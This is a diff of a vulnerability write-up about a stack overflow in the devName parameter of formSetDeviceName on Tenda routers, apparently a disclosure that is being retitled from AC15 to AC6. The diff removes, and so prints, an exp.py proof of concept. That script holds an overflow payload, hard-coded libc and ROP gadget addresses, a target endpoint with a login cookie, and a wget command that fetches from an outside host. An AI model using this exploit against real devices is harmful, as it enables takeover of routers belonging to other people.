@@ -1,12 +1,12 @@
-# tenda_ac15_stackflow_formSetDeviceName
+# tenda_ac6_stackflow_formSetDeviceName
 
 The devName function in the formSetDeviceName function causes a stack overflow.After constructing the ROP chain, malicious code can be executed.
 
-![](vx_images/230722251873970.png)
+![](vx_images/421393696172808.png)
 
-After obtaining the mac and devName parameters, enter the sub_C6D58 function
+After obtaining the mac and devName parameters, enter the set_device_name
 
-![](vx_images/491752506272548.png)
+![](vx_images/447226838405074.png)
 
 After concatenation, a stack overflow occurs.
 During dynamic debugging, it is found that the function needs to return 0 in order to reach the stack overflow point.
@@ -145,51 +145,15 @@ Therefore, we need to ensure that a0 contains {"mac": "BA:71:E8:E0:11:5B","devNa
 
 Then, a stack overflow will occur at the following location.
 
-![](vx_images/315457940724866.png)
-
-
-
-
-![](vx_images/208297400207610.png)
-
 
 Environment issue, the program needs to be tested on a physical machine.
+
+
+![](vx_images/528963759574261.png)
+
+![](vx_images/169193292924574.png)
+
 
 The program crashed.
 
 
-
-exp.py
-```
-#!/usr/bin/python3
-
-import requests
-from pwn import *
-
-target_ip = "192.168.0.3"
-target_port = 80  
-
-
-cmd = b"wget http://192.168.0.1:8000/"
-write_addr= 0x000641E8
-libc_base = 0x76DAB000
-system_offset = 0x5A270
-readable_addr_offset = 0x64144
-pop_r3_pc = 0x18298
-mov_ro_ret_r3_offset = 0x40CB8
-
-
-payload=b'a'*0x1000
-url = f"http://{target_ip}/goform/SetOnlineDevName" 
-cookie = {"cookie": "password=cmdcvb"}
-
-
-data = {"mac": "BA:71:E8:E0:11:5B","devName":payload}
-
-
-
-response = requests.post(url, cookies=cookie, data=data)
-response = requests.post(url, cookies=cookie, data=data)
-```
-
-ROP chain construction and exploitation, please see my GitHub ac15's exploitation chain construction.
